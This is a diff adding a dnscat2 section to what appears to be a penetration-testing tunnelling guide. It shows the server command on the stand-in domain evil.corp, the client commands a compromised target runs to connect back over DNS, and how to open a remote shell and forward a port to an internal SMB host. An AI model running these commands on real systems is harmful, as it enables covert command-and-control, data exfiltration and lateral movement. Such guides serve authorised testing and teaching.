@@ -37,7 +37,48 @@ veresk@kali$ ssh victim@10.1.1.2 -4 -D 1080 -Nf
 {% endtab %}
 
 {% tab title="dnscat2" %}
-TODO
+{% hint style="info" %}
+We consider that an authoritative DNS server for `evil.corp` has been registered and is pointing the Attacking IP hosting the dnscat2 server. But we can also perform this tunneling technique whitout a domain.&#x20;
+{% endhint %}
+
+We can use [dnscat2](https://github.com/iagox86/dnscat2) to infiltrate data using DNS with TXT (and other) records. First on the attacking host, we can start the dnscat server as follow
+
+```bash
+dnscat2-server evil.corp
+```
+
+On the target run one of the following commands to connect back to the server
+
+```bash
+# Connect if server is an authoritative DNS server.
+./dnscat evil.corp
+
+# talk directly to the server without a domain name
+./dnscat --dns server=x.x.x.x,port=53
+```
+
+We can start interacting with the target from our dncatserver
+
+```bash
+# List sessions
+dnscat2> windows
+
+# Select a session
+dnscat2> window -i <SESSION_ID>
+
+# We can:
+## Get a shell from a session
+command (pwnedHost) 1> shell
+[Ctrl+Z]
+
+dnscat2> window -i <SHELL_SESSION_ID>
+sh (pwnedHost) 2> whoami
+sh (pwnedHost) 2> user01
+
+## Do a port forward from a session
+#<DNSCAT_SRV_LOCAL_IP>:<DNSCAT_SRV_LOCAL_PORT> <REMOTE_IP>:<REMOTE_PORT>
+command (pwnedHost) 1> listen 127.0.0.1:4455 10.10.12.11:445 
+```
 {% endtab %}
 {% endtabs %}
 
